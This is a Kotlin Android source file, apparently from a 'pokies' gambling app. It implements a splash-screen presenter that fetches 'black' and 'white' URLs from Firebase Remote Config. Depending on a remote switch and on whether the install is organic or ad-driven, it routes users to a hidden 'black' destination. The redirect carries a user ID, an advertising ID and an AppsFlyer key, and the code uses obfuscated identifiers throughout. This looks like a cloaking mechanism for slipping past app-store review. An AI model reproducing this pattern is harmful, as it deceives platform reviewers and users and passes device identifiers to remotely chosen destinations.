package com.pok.onli.pokies.com.SplashActivityRep98po2

import android.net.Uri
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.pok.onli.pokies.com.Utils98po2.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class SplashPresenter98po2(private val splashMethods98po2: SplashContract98po2.SplashMethods98po2) : SplashContract98po2.SplashPresenterMethods98po2 {

    private var finalString98po2: String? = null

    override fun thisEndsHere98po2() {
        splashMethods98po2.onClick98po2 {
            CoroutineScope(Dispatchers.Main).launch {
                delay(5000)
                finalString98po2 =
                    if (fbBlackValue98po2 == null || fbBlackValue98po2 == "empty") {
                        fbWhiteValue98po2 ?: return@launch
                    } else {
                        if (status98po2 == "Non-organic") {
                            if (key98po2.toString().length != 20) {
                                Uri.parse(fbBlackValue98po2).buildUpon()
                                    .appendQueryParameter("key", fbDefaultValue98po2)
                                    .appendQueryParameter(
                                        "bundle",
                                        splashMethods98po2.getPackageName98po2()
                                    )
                                    .appendQueryParameter("sub4", adGroup98po2)
                                    .appendQueryParameter("sub5", adSet98po2)
                                    .appendQueryParameter("sub6", afChannel98po2)
                                    .appendQueryParameter("sub7", "Default")
                                    .toString()
                                    .plus(
                                        "&sub10=$uid98po2||$AID98po2||${
                                            decodeString98po2(CODE_APPSFLYER_98po2)
                                        }"
                                    )

                            } else {
                                Uri.parse(fbBlackValue98po2).buildUpon()
                                    .appendQueryParameter("key", key98po2)
                                    .appendQueryParameter(
                                        "bundle",
                                        splashMethods98po2.getPackageName98po2()
                                    )
                                    .appendQueryParameter("sub2", sub298po2)
                                    .appendQueryParameter("sub3", sub398po2)
                                    .appendQueryParameter("sub4", adGroup98po2)
                                    .appendQueryParameter("sub5", adSet98po2)
                                    .appendQueryParameter("sub6", afChannel98po2)
                                    .appendQueryParameter("sub7", mediaSource98po2)
                                    .toString()
                                    .plus(
                                        "&sub10=$uid98po2||$AID98po2||${
                                            decodeString98po2(CODE_APPSFLYER_98po2)
                                        }"
                                    )

                            }
                        } else {
                            Uri.parse(fbBlackValue98po2).buildUpon()
                                .appendQueryParameter("key", fbDefaultValue98po2)
                                .appendQueryParameter(
                                    "bundle",
                                    splashMethods98po2.getPackageName98po2()
                                )
                                .appendQueryParameter("sub7", "Organic")
                                .toString()
                                .plus(
                                    "&sub10=$uid98po2||$AID98po2||${
                                        decodeString98po2(CODE_APPSFLYER_98po2)
                                    }"
                                )

                        }
                    }
                splashMethods98po2.startNewActivity98po2(
                    finalString98po2 ?: return@launch
                )
            }
        }
    }

    override fun setupFB98po2() {
        Firebase.remoteConfig.run {
            setConfigSettingsAsync(
                remoteConfigSettings {
                    minimumFetchIntervalInSeconds = 1000
                })
            setDefaultsAsync(
                mapOf(
                    FB_BLACK_KEY_98po2 to "empty"
                )
            )
            fetchAndActivate().addOnCompleteListener {
                if (it.isSuccessful) {
                    fbBlackValue98po2 = getString(FB_BLACK_KEY_98po2)
                    fbDefaultValue98po2 = getString(FB_DEFAULT_KEY_98po2)
                    fbWhiteValue98po2 = getString(FB_WHITE_KEY_98po2)
                }
            }
        }
    }
}